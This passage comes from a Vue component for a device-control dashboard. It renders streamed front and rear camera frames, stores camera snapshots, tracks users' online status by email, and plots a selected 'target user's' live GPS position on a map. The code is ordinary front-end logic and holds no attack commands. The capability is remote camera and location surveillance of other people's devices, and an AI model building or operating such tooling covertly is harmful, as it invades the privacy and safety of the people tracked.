    const dataUrl = 'data:image/jpeg;base64,' + data.image
    snapshotImages.value.push({ source, dataUrl })
    if (streamStatus.value === 'snapshot_requesting') {
      streamStatus.value = 'idle'
    }
    snapshotProgress.value = 100
    snapshotProgressText.value = '抓拍完成!'

    const imageSizeKB = Math.round(data.image.length * 3 / 4 / 1024)
    ElMessage.success(`${source === 'rear' ? '后置' : '前置'}抓拍成功 (${imageSizeKB}KB)`)
    saveSnapshotToLocal(data.image, source)

    setTimeout(() => {
      snapshotProgress.value = 0
    }, 2000)
  } else {
    ElMessage.error('抓拍数据格式异常')
    snapshotProgress.value = 0
  }
}

function handleOnlineUsers(data) {
  loadingUsers.value = false
  onlineUsers.value = (data.users || []).map(u => ({
    id: u.id,
    email: u.email,
    isOnline: true,
  }))
}

function handleUserOnline(data) {
  const { id, email } = data
  const existing = onlineUsers.value.find(u => u.id == id)
  if (existing) {
    existing.isOnline = true
  } else {
    onlineUsers.value.push({ id, email, isOnline: true })
  }
}

function handleUserOffline(data) {
  const { id } = data
  const existing = onlineUsers.value.find(u => u.id == id)
  if (existing) {
    existing.isOnline = false
  }

  // 如果正在追踪该用户的GPS，清除数据
  if (gpsTrackingUserId.value == id) {
    gpsTrackingUserId.value = null
    currentGpsData.value = null
    ElMessage.warning('目标用户已离线，GPS追踪已停止')
  }
}

// ============================================================
// v1.52.5+ GPS位置更新处理
// ============================================================
function handleGpsPosition(data) {
  // 存储到数据映射表
  gpsDataMap.value = {
    ...gpsDataMap.value,
    [data.userId]: data
  }

  // 如果正在追踪该用户，更新显示
  if (gpsTrackingUserId.value == data.userId) {
    currentGpsData.value = data

    // 更新地图位置
    if (activeTab.value === 'gps') {
      updateMapPosition(data.latitude, data.longitude)
    }
  }
}

// ============================================================
// YUV帧渲染
// ============================================================
function renderFrame(data) {
  const source = data.source || 'front'
  const canvasRef = source === 'rear' ? rearCanvasRef : frontCanvasRef
  const canvas = canvasRef.value
  if (!canvas) return

  if (source === 'rear') {
    rearStreamActive.value = true
  } else {
    frontStreamActive.value = true
  }

  frameCount++

  const { width, height, y, u, v, yRowStride, uRowStride, vRowStride } = data

  if (canvas.width !== width || canvas.height !== height) {
    canvas.width = width
    canvas.height = height
  }

  const ctx = canvas.getContext('2d')
  const imageData = ctx.createImageData(width, height)
  const pixels = imageData.data

  const yBytes = base64ToUint8Array(y)
  const uBytes = base64ToUint8Array(u)
  const vBytes = base64ToUint8Array(v)

  for (let row = 0; row < height; row++) {
    for (let col = 0; col < width; col++) {
      const yIndex = row * yRowStride + col
      const uvRow = row >> 1
      const uvCol = col >> 1
      const uIndex = uvRow * uRowStride + uvCol
      const vIndex = uvRow * vRowStride + uvCol

      const yVal = yBytes[yIndex] || 0
      const uVal = uBytes[uIndex] || 128
      const vVal = vBytes[vIndex] || 128

      const r = yVal + 1.402 * (vVal - 128)
      const g = yVal - 0.344 * (uVal - 128) - 0.714 * (vVal - 128)
      const b = yVal + 1.772 * (uVal - 128)

      const pixelIndex = (row * width + col) * 4
      pixels[pixelIndex] = Math.max(0, Math.min(255, r))
      pixels[pixelIndex + 1] = Math.max(0, Math.min(255, g))
      pixels[pixelIndex + 2] = Math.max(0, Math.min(255, b))
      pixels[pixelIndex + 3] = 255
    }
  }

  ctx.putImageData(imageData, 0, 0)
}

function base64ToUint8Array(base64) {
  const binary = atob(base64)
  const len = binary.length
  const bytes = new Uint8Array(len)
  for (let i = 0; i < len; i++) {
    bytes[i] = binary.charCodeAt(i)
  }
  return bytes
}

// ============================================================
// 组件销毁时的清理
// ============================================================
onBeforeUnmount(() => {
  intentionalDisconnect = true
  if (reconnectTimer) {
    clearTimeout(reconnectTimer)
    reconnectTimer = null
  }
  stopSpeedCalc()
  stopRequestProgress()
  if (ws) {
    ws.close()
    ws = null
  }
  if (leafletMap) {
    leafletMap.remove()
    leafletMap = null
  }
})
</script>

<style scoped>
.device-control {
  max-width: 1200px;
}
.page-title {
  margin: 0 0 20px 0;
  font-size: 22px;
  color: #303133;
}
.status-card,
.user-card,
.video-card,
.save-card,
.gps-info-card,
.map-card {
  margin-bottom: 20px;
}

/* 多标签页样式 */
.control-tabs {
  margin-top: 0;
}

/* 卡片头部 */
.card-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  flex-wrap: wrap;
  gap: 8px;
}

/* 摄像头控制栏 */
.camera-controls {
  display: flex;
  align-items: center;
  gap: 8px;
}

/* 视频容器 */
.video-container {
  width: 100%;
  min-height: 360px;
  background: #1a1a2e;
  border-radius: 8px;
  overflow: hidden;
  display: flex;
  align-items: center;
  justify-content: center;
  position: relative;
  flex-wrap: wrap;
}
.video-container.dual-mode {
  display: flex;
  gap: 4px;
  padding: 4px;
}
.video-panel {
  flex: 1;
  min-width: 0;
  display: flex;
  flex-direction: column;
  align-items: center;
  position: relative;
}
.video-label {
  position: absolute;
  top: 8px;
  left: 8px;
  background: rgba(0,0,0,0.6);
  color: #fff;
  padding: 2px 8px;
  border-radius: 4px;
  font-size: 12px;
  z-index: 10;
}
.video-canvas {
  width: 100%;
  height: auto;
  max-height: 480px;
  object-fit: contain;
}

/* 抓拍 */
.snapshot-panel {
  display: flex;
  gap: 8px;
  width: 100%;
  padding: 8px;
}
.snapshot-item {
  flex: 1;
  position: relative;
  display: flex;
  flex-direction: column;
  align-items: center;
}
.snapshot-image {
  width: 100%;
  max-height: 480px;
  object-fit: contain;
}
.video-placeholder {
  text-align: center;
  color: #909399;
  padding: 40px 0;
  width: 100%;
}
.video-placeholder p {
  margin-top: 12px;
  font-size: 14px;
}

/* 请求推流进度 */
.requesting-info {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 4px;
}
.requesting-title {
  font-size: 15px;
  color: #606266;
  margin: 8px 0 0 0;
}
.requesting-stats {
  display: flex;
  gap: 16px;
  margin-top: 8px;
  font-size: 12px;
  color: #909399;
}
.snapshot-actions {
  margin-top: 12px;
  display: flex;
  gap: 8px;
  justify-content: center;
}

/* 传输速度信息栏 */
.stream-stats {
  display: flex;
  gap: 24px;
  padding: 8px 16px;
  background: #f5f7fa;
  border-radius: 4px;
  margin-top: 8px;
  flex-wrap: wrap;
}
.stat-item {
  display: flex;
  align-items: center;
  gap: 4px;
}
.stat-label {
  color: #909399;
  font-size: 13px;
}
.stat-value {
  color: #409eff;
  font-size: 13px;
  font-weight: 500;
  font-family: 'Courier New', monospace;
}

/* 选中行高亮 */
:deep(.selected-row) {
  background-color: #ecf5ff !important;
}

/* ============================================================
   v1.52.5+ GPS地图样式
   ============================================================ */
.map-container {
  width: 100%;
  height: 480px;
  border-radius: 8px;
  overflow: hidden;
}

.no-track-placeholder {
  text-align: center;
  padding: 60px 0;
}

/* GPS标记脉冲动画效果 */
:deep(.gps-marker-icon) {
  background: none !important;
  border: none !important;
}
.gps-marker-pulse {
  width: 20px;
  height: 20px;
  background: rgba(64, 158, 255, 0.3);
  border-radius: 50%;
  position: absolute;
  top: 0;
  left: 0;
  animation: gps-pulse 2s ease-out infinite;
}
.gps-marker-dot {
  width: 10px;
  height: 10px;
  background: #409eff;
  border: 2px solid #fff;
  border-radius: 50%;
  position: absolute;
  top: 5px;
  left: 5px;
  box-shadow: 0 0 4px rgba(64, 158, 255, 0.6);
}
@keyframes gps-pulse {
  0% { transform: scale(1); opacity: 0.8; }
  100% { transform: scale(3); opacity: 0; }
}
</style>